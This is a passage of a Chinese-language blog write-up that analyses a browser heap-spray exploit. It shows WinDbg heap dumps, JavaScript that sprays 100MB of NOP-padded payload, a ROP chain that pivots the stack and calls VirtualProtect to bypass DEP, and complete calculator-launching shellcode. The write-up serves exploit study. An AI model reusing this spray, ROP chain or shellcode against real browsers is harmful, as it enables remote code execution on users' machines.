class=\"line\">&gt;  fffe0 65 - 64ff360  (99.12)</span><br><span class=\"line\">&gt;  40010 1 - 40010  (0.25)</span><br><span class=\"line\">&gt;  1034 10 - 10340  (0.06)</span><br><span class=\"line\">&gt;  20 356 - 6ac0  (0.03)</span><br><span class=\"line\">&gt;  494 16 - 64b8  (0.02)</span><br><span class=\"line\">&gt;  5ba0 1 - 5ba0  (0.02)</span><br><span class=\"line\">&gt;  5e4 b - 40cc  (0.02)</span><br><span class=\"line\">&gt;  4010 1 - 4010  (0.02)</span><br><span class=\"line\">&gt;  3980 1 - 3980  (0.01)</span><br><span class=\"line\">&gt;  d0 3e - 3260  (0.01)</span><br><span class=\"line\">&gt;  460 b - 3020  (0.01)</span><br><span class=\"line\">&gt;  1800 2 - 3000  (0.01)</span><br><span class=\"line\">&gt;  800 6 - 3000  (0.01)</span><br><span class=\"line\">&gt;  468 a - 2c10  (0.01)</span><br><span class=\"line\">&gt;  2890 1 - 2890  (0.01)</span><br><span class=\"line\">&gt;  78 52 - 2670  (0.01)</span><br><span class=\"line\">&gt;  10 215 - 2150  (0.01)</span><br><span class=\"line\">&gt;  1080 2 - 2100  (0.01)</span><br><span class=\"line\">&gt;  2b0 c - 2040  (0.01)</span><br><span class=\"line\">&gt;  2010 1 - 2010  (0.01)</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>可以看到有0x65（101）个size为0xfffe0（1MB减去20字节的堆头）。</p>\n<p>然后查看特定大小的堆块，接下来的命令列出了所有大小为0xfffe0的堆块。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; !heap -flt s fffe0</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt; \t\t_HEAP @ 360000</span><br><span class=\"line\">&gt;    HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</span><br><span class=\"line\">&gt;      037f0018 1fffc fffc  [00]   037f0020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      038f0018 1fffc fffc  [00]   038f0020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      039f0018 1fffc fffc  [00]   039f0020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      03af0018 1fffc fffc  [00]   03af0020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      03bf0018 1fffc fffc  [00]   03bf0020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      05e80018 1fffc fffc  [00]   05e80020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      05f80018 1fffc fffc  [00]   05f80020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      06080018 1fffc fffc  [00]   06080020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      06180018 1fffc fffc  [00]   06180020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      …</span><br><span class=\"line\">&gt;      0aa80018 1fffc fffc  [00]   0aa80020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      0ab80018 1fffc fffc  [00]   0ab80020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      0ac80018 1fffc fffc  [00]   0ac80020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      0ad80018 1fffc fffc  [00]   0ad80020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      0ae80018 1fffc fffc  [00]   0ae80020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      0af80018 1fffc fffc  [00]   0af80020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      0b080018 1fffc fffc  [00]   0b080020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      0b180018 1fffc fffc  [00]   0b180020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      0b280018 1fffc fffc  [00]   0b280020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      0b380018 1fffc fffc  [00]   0b380020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;  _HEAP @ 10000</span><br><span class=\"line\">&gt;  _HEAP @ 270000</span><br><span class=\"line\">&gt;  _HEAP @ 750000</span><br><span class=\"line\">&gt;  _HEAP @ 2e20000</span><br><span class=\"line\">&gt;  _HEAP @ 35b0000</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>每次分配都是顺序分配的。</p>\n<p>因为我们能看到堆块的地址，我们查看一下0x41的位置（即shellcode的位置）：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; 0:007&gt; db 06b80000</span><br><span class=\"line\">&gt; 06b80000  00 00 c8 06 00 00 a8 06-00 00 00 00 00 00 00 00  ................</span><br><span class=\"line\">&gt; 06b80010  00 00 10 00 00 00 10 00-61 65 15 29 00 00 00 04  ........ae.)....</span><br><span class=\"line\">&gt; 06b80020  da ff 0f 00 41 41 41 41-41 41 41 41 41 41 41 41  ....AAAAAAAAAAAA</span><br><span class=\"line\">&gt; 06b80030  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class=\"line\">&gt; 06b80040  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class=\"line\">&gt; 06b80050  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class=\"line\">&gt; 06b80060  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class=\"line\">&gt; 06b80070  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>我们能够清楚地看到0x20偏移处的值，为字符串的长度——0xfffda，是减去NULL终止符的字符串长度。</p>\n</blockquote>\n<p>理解了这个后，我们再来看exp。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"comment\">//初始化堆喷数据</span></span><br><span class=\"line\"> <span class=\"keyword\">var</span> padding = <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u9090\"</span>); <span class=\"comment\">// unescape函数将类似%xx和%uxxxx的字符序列（x表示十六进制数字），用Unicode字符\\u00xx和\\uxxxx替换这样的字符序列进行解码。这里\\x90是NOP指令</span></span><br><span class=\"line\"> <span class=\"keyword\">while</span> (padding.length &lt; <span class=\"number\">1000</span>)</span><br><span class=\"line\">     padding = padding + padding; </span><br><span class=\"line\"> <span class=\"keyword\">var</span> padding = padding.substr(<span class=\"number\">0</span>, <span class=\"number\">1000</span> - shellcode.length);</span><br><span class=\"line\"> shellcode+= padding; <span class=\"comment\">// 在ROP+shellcode后padding NOP指令到1000字节，但是内存中实际分配2000字节</span></span><br><span class=\"line\"> <span class=\"keyword\">while</span> (shellcode.length &lt; <span class=\"number\">100000</span>) </span><br><span class=\"line\">     shellcode = shellcode + shellcode;</span><br><span class=\"line\"> <span class=\"keyword\">var</span> onemeg = shellcode.substr(<span class=\"number\">0</span>, <span class=\"number\">64</span>*<span class=\"number\">1024</span>/<span class=\"number\">2</span>); <span class=\"comment\">// 64K</span></span><br><span class=\"line\"> <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">14</span>; i++) &#123;</span><br><span class=\"line\">     onemeg += shellcode.substr(<span class=\"number\">0</span>, <span class=\"number\">64</span>*<span class=\"number\">1024</span>/<span class=\"number\">2</span>);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> onemeg += shellcode.substr(<span class=\"number\">0</span>, (<span class=\"number\">64</span>*<span class=\"number\">1024</span>/<span class=\"number\">2</span>)-(<span class=\"number\">38</span>/<span class=\"number\">2</span>)); <span class=\"comment\">// 64K * 16，即1MB</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//通过堆喷布局rop和shellcode</span></span><br><span class=\"line\"> <span class=\"keyword\">var</span> spray = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br><span class=\"line\"> <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">100</span>; i++) &#123;</span><br><span class=\"line\">     spray[i] = onemeg.substr(<span class=\"number\">0</span>, onemeg.length);</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>单次堆喷数据的组织形式其实与上述是类似的</p>\n<ul>\n<li>ROP（栈迁移） + shellcode + padding = 1000 byte</li>\n<li>不断重复，直到64K</li>\n<li>再以64K的块，扩展到1MB（64KB*16）</li>\n<li>喷100次，共100MB</li>\n</ul>\n<p>稍微看一下ROP链和shellcode的代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> shellcode = <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u4141%u4141%u4242%u4242%u4343%u4343\"</span>); <span class=\"comment\">// PADDING</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u4141%u4141%u4242%u4242%u4343%u4343\"</span>); <span class=\"comment\">// PADDING</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u4141%u4141\"</span>); <span class=\"comment\">// PADDING</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//ROP链中的Gadget地址和参数布局，以实现栈转移和DEP绕过</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop1+<span class=\"string\">\"%u\"</span>+rop2); <span class=\"comment\">// RETN</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop3+<span class=\"string\">\"%u\"</span>+rop4); <span class=\"comment\">// POP EBP # RETN</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop5+<span class=\"string\">\"%u\"</span>+rop6); <span class=\"comment\">// XCHG EAX,ESP # RETN</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop3+<span class=\"string\">\"%u\"</span>+rop4); <span class=\"comment\">// POP EBP</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop3+<span class=\"string\">\"%u\"</span>+rop4); <span class=\"comment\">// POP EBP</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop7+<span class=\"string\">\"%u\"</span>+rop8); <span class=\"comment\">// POP EBP</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u1024%u0000\"</span>); <span class=\"comment\">// Size 0x00001024</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop9+<span class=\"string\">\"%u\"</span>+rop10); <span class=\"comment\">// POP EDX</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u0040%u0000\"</span>); <span class=\"comment\">// 0x00000040</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop11+<span class=\"string\">\"%u\"</span>+rop12); <span class=\"comment\">// POP ECX</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+writable1+<span class=\"string\">\"%u\"</span>+writable2); <span class=\"comment\">// Writable Location</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop13+<span class=\"string\">\"%u\"</span>+rop14); <span class=\"comment\">// POP EDI</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop1+<span class=\"string\">\"%u\"</span>+rop2); <span class=\"comment\">// RET</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop15+<span class=\"string\">\"%u\"</span>+rop16); <span class=\"comment\">// POP ESI</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+jmpeax1+<span class=\"string\">\"%u\"</span>+jmpeax2); <span class=\"comment\">// JMP EAX</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop17+<span class=\"string\">\"%u\"</span>+rop18); <span class=\"comment\">// POP EAX</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+vp1+<span class=\"string\">\"%u\"</span>+vp2); <span class=\"comment\">// VirtualProtect()</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop19+<span class=\"string\">\"%u\"</span>+rop20); <span class=\"comment\">// MOV EAX,DWORD PTR DS:[EAX]</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop21+<span class=\"string\">\"%u\"</span>+rop22); <span class=\"comment\">// PUSHAD</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop23+<span class=\"string\">\"%u\"</span>+rop24); <span class=\"comment\">// PUSH ESP</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u9090%u9090\"</span>); <span class=\"comment\">// NOPs</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u9090%u9090\"</span>); <span class=\"comment\">// NOPs</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u9090%u9090\"</span>); <span class=\"comment\">// NOPs</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹出计算器的shellcode</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%u6c61%u2e63%u7865%u0065\"</span>);</span><br></pre></td></tr></table></figure>\n<p>也就是说第一条gadget的前面还有14 * 2 = 28字节(0x1c)的padding，所以第一条gadget的地址应该为0x24+0x1c = 0x40</p>\n<p>调试验证：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; !heap -stat</span><br><span class=\"line\">_HEAP 003d0000</span><br><span class=\"line\">     Segments            00000001</span><br><span class=\"line\">         Reserved  bytes 00100000</span><br><span class=\"line\">         Committed bytes 00100000</span><br><span class=\"line\">     VirtAllocBlocks     00000001</span><br><span class=\"line\">         VirtAlloc bytes 038b0000</span><br><span class=\"line\">_HEAP 02cc0000</span><br><span class=\"line\">     Segments            00000001</span><br><span class=\"line\">         Reserved  bytes 00040000</span><br><span class=\"line\">         Committed bytes 0002b000</span><br><span class=\"line\">     VirtAllocBlocks     00000000</span><br><span class=\"line\">         VirtAlloc bytes 00000000</span><br><span class=\"line\">_HEAP 01240000</span><br><span class=\"line\">     Segments            00000001</span><br><span class=\"line\">         Reserved  bytes 00040000</span><br><span class=\"line\">         Committed bytes 00012000</span><br><span class=\"line\">     VirtAllocBlocks     00000000</span><br><span class=\"line\">         VirtAlloc bytes 00000000</span><br><span class=\"line\">_HEAP 002f0000</span><br><span class=\"line\">     Segments            00000001</span><br><span class=\"line\">         Reserved  bytes 00010000</span><br><span class=\"line\">         Committed bytes 00010000</span><br><span class=\"line\">     VirtAllocBlocks     00000000</span><br><span class=\"line\">         VirtAlloc bytes 00000000</span><br><span class=\"line\">_HEAP 024a0000</span><br><span class=\"line\">     Segments            00000001</span><br><span class=\"line\">         Reserved  bytes 00040000</span><br><span class=\"line\">         Committed bytes 00001000</span><br><span class=\"line\">     VirtAllocBlocks     00000000</span><br><span class=\"line\">         VirtAlloc bytes 00000000</span><br><span class=\"line\">_HEAP 00010000</span><br><span class=\"line\">     Segments            00000001</span><br><span class=\"line\">         Reserved  bytes 00010000</span><br><span class=\"line\">         Committed bytes 00001000</span><br><span class=\"line\">     VirtAllocBlocks     00000000</span><br><span class=\"line\">         VirtAlloc bytes 00000000</span><br><span class=\"line\">0:005&gt; !heap -stat -h 003d0000</span><br><span class=\"line\"> heap @ 003d0000</span><br><span class=\"line\">group-by: TOTSIZE max-display: 20</span><br><span class=\"line\">    size     #blocks     total     ( %) (percent of total busy bytes)</span><br><span class=\"line\">    fffe0 65 - 64ff360  (98.77)</span><br><span class=\"line\">    3e810 1 - 3e810  (0.24)</span><br><span class=\"line\">    100 269 - 26900  (0.15)</span><br><span class=\"line\">    fc fb - f714  (0.06)</span><br><span class=\"line\">    1034 f - f30c  (0.06)</span><br><span class=\"line\">    7d10 1 - 7d10  (0.03)</span><br><span class=\"line\">    494 1b - 7b9c  (0.03)</span><br><span class=\"line\">    20 356 - 6ac0  (0.03)</span><br><span class=\"line\">    58 125 - 64b8  (0.02)</span><br><span class=\"line\">    5ba0 1 - 5ba0  (0.02)</span><br><span class=\"line\">    40 163 - 58c0  (0.02)</span><br><span class=\"line\">    4c 121 - 55cc  (0.02)</span><br><span class=\"line\">    52ac 1 - 52ac  (0.02)</span><br><span class=\"line\">    5e4 b - 40cc  (0.02)</span><br><span class=\"line\">    200c 2 - 4018  (0.02)</span><br><span class=\"line\">    3e90 1 - 3e90  (0.01)</span><br><span class=\"line\">    3de0 1 - 3de0  (0.01)</span><br><span class=\"line\">    3ddc 1 - 3ddc  (0.01)</span><br><span class=\"line\">    3980 1 - 3980  (0.01)</span><br><span class=\"line\">    d0 3d - 3190  (0.01)</span><br><span class=\"line\">0:005&gt; !heap -flt s fffe0</span><br><span class=\"line\">    _HEAP @ 3d0000</span><br><span class=\"line\">      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</span><br><span class=\"line\">        03280018 1fffc 0000  [00]   03280020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        038b0018 1fffc fffc  [00]   038b0020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        039b0018 1fffc fffc  [00]   039b0020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        04a00018 1fffc fffc  [00]   04a00020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        04b00018 1fffc fffc  [00]   04b00020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        04c00018 1fffc fffc  [00]   04c00020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        04d00018 1fffc fffc  [00]   04d00020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        04e00018 1fffc fffc  [00]   04e00020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        04f00018 1fffc fffc  [00]   04f00020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        05000018 1fffc fffc  [00]   05000020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06550018 1fffc fffc  [00]   06550020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06650018 1fffc fffc  [00]   06650020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06750018 1fffc fffc  [00]   06750020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06850018 1fffc fffc  [00]   06850020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06950018 1fffc fffc  [00]   06950020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06a50018 1fffc fffc  [00]   06a50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06b50018 1fffc fffc  [00]   06b50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06c50018 1fffc fffc  [00]   06c50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06d50018 1fffc fffc  [00]   06d50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06e50018 1fffc fffc  [00]   06e50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06f50018 1fffc fffc  [00]   06f50020    fffe0 - (busy 